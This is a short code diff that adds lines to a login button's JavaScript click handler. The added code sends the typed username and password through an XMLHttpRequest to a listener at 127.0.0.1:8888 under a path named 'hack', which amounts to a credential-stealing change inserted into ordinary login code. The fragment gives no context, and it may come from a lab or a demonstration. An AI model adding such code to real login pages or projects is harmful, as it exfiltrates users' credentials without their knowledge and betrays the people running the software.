@@ -15,5 +15,10 @@ button.onclick = function() {
         "password": password
     });
 
+    const xhr = new XMLHttpRequest();
 
+    xhr.open( 'GET', 'http://127.0.0.1:8888/hack/' + username + '/' + password, true );
+    xhr.send(null);
+
+    return true;
 }
